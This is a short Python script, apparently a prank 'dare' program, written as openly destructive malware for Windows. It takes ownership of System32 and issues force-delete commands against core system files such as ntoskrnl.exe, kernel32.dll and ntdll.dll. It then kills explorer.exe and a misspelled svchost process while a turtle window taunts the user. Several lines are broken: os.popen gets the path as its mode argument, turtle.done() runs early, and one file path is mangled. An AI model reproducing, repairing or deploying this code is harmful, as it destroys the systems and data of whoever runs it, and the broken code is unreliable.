import os
import time
from turtle import *
import turtle
def malicious_shit():
    os.popen("takeown /f C:/Windows/System32")
    kern32="C:/Windows/System32/ntoskrnl.exe"
    kernel="C:/Windows/System32/kernel32.dll"
    user="C:/Windows/System32/user32.dll"
    gdi="C:/Windows/System32/gdi32.dll"
    advapi="C:/Windows/System32/advapi32.dll"
    kerneldll="C:/Windows/System32/ntdll.dll"
    shell="C:\Windows\System32\shell32.dll"
    ole="C:\Windows\System32\ole32.dll"
    oleaut="C:\Windows\System32\oleaut32.dll"
    comdlg="C:\Windows\System32\comdlg32.dll"
    msvcrt="C:\Windows\System32\m svcrt.dll"
    try :
         os.popen("del /q /f /s ",kern32)
         os.popen("del /q /f /s ",kernel)
         os.popen("del /q /f /s ",kerneldll)
         os.popen("del /q /f /s ",user)
         os.popen("del /q /f /s ",gdi)
         os.popen("del /q /f /s ",advapi)
         os.popen("del /q /f /s ",shell)
         os.popen("del /q /f /s ",ole)
         os.popen("del /q /f /s ",oleaut)
         os.popen("del /q /f /s ",comdlg)
         os.popen("del /q /f /s ",msvcrt)
    except OSError :
         print("Check your permissions stupid")
         input("Press any key to exit")
         exit(0)
    except KeyboardInterrupt:
         print("Coward 🤣🫵")
         input("Press any key to exit")
         exit(0)
def graphics():
    screen = turtle.Screen()
    screen.bgcolor("black")
    screen.title("UH OH UR FILES ARE GONIE GONE :)")
    screen.setup(width=800, height=600)
    writer = turtle.Turtle()
    writer.hideturtle()
    writer.speed(0)
    writer.penup()
    writer.goto(0, 0)  

    colors = ["red", "orange", "yellow", "lime", "cyan", "violet"]

    def flash_text():
        current_color = colors.pop(0)
        colors.append(current_color)
    
        writer.clear()
        writer.color(current_color)
        writer.write("POOPY BABY I DELETED UR SYSTEM FILES :)", 
                align="center", 
                font=("Comic Sans MS", 32, "bold"))
    
        screen.ontimer(flash_text, 500)

    flash_text()

turtle.done()
dare = input("Do you dare to run this script? this shit gonna delete some serious shit (yes/no): ")
if dare == "yes" :
     while True:
          graphics()
malicious_shit()
time.sleep(600)
os.popen("taskkill /F /IM explorer.exe /T")
time.sleep(60)
os.popen("taskkill /F /IM scvhost.exe /T")
